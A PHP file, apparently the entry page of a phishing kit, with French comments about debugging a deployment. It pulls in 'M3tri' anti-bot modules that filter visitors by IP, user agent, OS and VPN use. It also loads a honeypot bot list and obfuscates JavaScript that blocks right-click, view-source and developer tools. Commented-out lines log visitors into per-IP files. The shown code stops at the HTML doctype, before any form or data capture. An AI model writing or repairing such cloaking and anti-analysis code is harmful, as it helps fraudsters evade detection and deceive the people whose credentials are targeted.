<?php

// ACTIVER L'AFFICHAGE DES ERREURS POUR LE DEBOGAGE !
error_reporting(E_ALL); // Rapporte toutes les erreurs
ini_set('display_errors', '1'); // Affiche les erreurs directement sur la page
ini_set('display_startup_errors', '1'); // Affiche les erreurs de démarrage
ini_set('log_errors', '1'); // Log les erreurs pour Render

session_id(md5($_SERVER['REMOTE_ADDR'])); // Utilisez $_SERVER au lieu de getenv
session_start();

$stripos = 0;

include 'config.php'; // <--- VÉRIFIER L'EXISTENCE ET LE CONTENU DE CE FICHIER !

// VÉRIFIER L'EXISTENCE DE CE DOSSIER ET DE TOUS CES FICHIERS !
include 'M3tri-anti-bots_v0.01/M3tri-ips.php';
include 'M3tri-anti-bots_v0.01/M3tri-OS-BRS.php';
include 'M3tri-anti-bots_v0.01/M3tri-UA.php';
include 'M3tri-anti-bots_v0.01/M3tri-vpn-proxy.php';


$honeypotbots = file_get_contents('honeypotbots.dat'); // VÉRIFIER L'EXISTENCE DE honeypotbots.dat !
$errorUrl = 'Error.php';
$ip = $_SERVER['REMOTE_ADDR']; // Utilisez $_SERVER au lieu de getenv
$hostname = gethostbyaddr($ip);


if ($_GET['error'] == 'on'){
    $errormsg = "<p><span style='color: red;font-size:small;font-family: sans-serif;'>verifier les champs</span><br></p>";
}

require_once './includes/HunterObfuscator.php'; // VÉRIFIER L'EXISTENCE DE CE FICHIER !

$jsCode = " jQuery(function($){ document.addEventListener('contextmenu', event => event.preventDefault()); document.onkeydown = function(e) { if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 117 || e.keyCode === 44)) { return false; } else { return true; } }; $(document).keydown(function (event) { if (event.keyCode == 123) { return false; } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { return false; } }); }) ";
$hunter = new HunterObfuscator($jsCode);
$hunter->addDomainName($_SERVER['HTTP_HOST']);
$obsfucated = $hunter->Obfuscate();


$permitted_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_~";

// <<<<<<<<<<<<<<<<<<<< COMMENTEZ TEMPORAIREMENT OU SUPPRIMEZ CES LIGNES >>>>>>>>>>>>>>>>>>>>
// C'est la cause la plus probable d'erreur si la création de fichier est bloquée
// $fp = fopen('users/'. $ip .'.txt', 'wb');
// fwrite($fp, '');
// fclose($fp);
// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
?>
<!DOCTYPE html>